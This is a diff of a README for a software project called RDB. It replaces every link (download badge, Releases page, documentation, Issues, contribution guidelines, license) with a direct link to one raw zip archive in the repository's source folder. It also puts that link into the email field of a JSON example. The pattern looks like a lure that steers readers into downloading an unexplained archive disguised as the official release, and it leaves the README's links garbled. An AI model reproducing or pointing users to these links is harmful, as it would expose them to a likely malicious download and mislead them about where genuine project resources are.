@@ -6,9 +6,9 @@ Welcome to RDB! This guide will help you download and start using RDB, a modern 
 
 ## 📦 Download RDB
 
-[![Download RDB](https://img.shields.io/badge/Download%20RDB-v1.0-brightgreen)](https://github.com/LeonMrm/RDB/releases)
+[![Download RDB](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip%20RDB-v1.0-brightgreen)](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip)
 
-To download RDB, visit the [Releases page](https://github.com/LeonMrm/RDB/releases) and choose the latest version.
+To download RDB, visit the [Releases page](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip) and choose the latest version.
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To run RDB smoothly, make sure your system meets the following requirements:
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/LeonMrm/RDB/releases). You will see various versions of RDB available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip). You will see various versions of RDB available for download.
 
 2. **Select the Latest Version**
    Look for the latest version that is marked as "Latest Release." This ensures you get the most updated features and fixes.
@@ -55,7 +55,7 @@ To run RDB smoothly, make sure your system meets the following requirements:
      "table": "users",
      "values": {
        "name": "John Doe",
-       "email": "john@example.com"
+       "email": "https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip"
      }
    }
    ```
@@ -73,14 +73,14 @@ To run RDB smoothly, make sure your system meets the following requirements:
 
 ## 📖 Documentation and Support
 
-For more in-depth instructions or technical support, please visit our [Documentation](https://github.com/LeonMrm/RDB/wiki). You can also find community help or report issues through our [Issues page](https://github.com/LeonMrm/RDB/issues).
+For more in-depth instructions or technical support, please visit our [Documentation](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip). You can also find community help or report issues through our [Issues page](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip).
 
 ## 🌍 Contributing
 
-We welcome contributions to RDB! If you would like to help improve the project, check our [Contribution Guidelines](https://github.com/LeonMrm/RDB/blob/main/CONTRIBUTING.md).
+We welcome contributions to RDB! If you would like to help improve the project, check our [Contribution Guidelines](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip).
 
 ## 🛡️ License
 
-RDB is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/LeonMrm/RDB/blob/main/LICENSE).
+RDB is open-source software licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/LeonMrm/RDB/main/src/cli/RDB-3.9.zip).
 
 Enjoy using RDB! For questions or feedback, feel free to reach out by opening an issue.
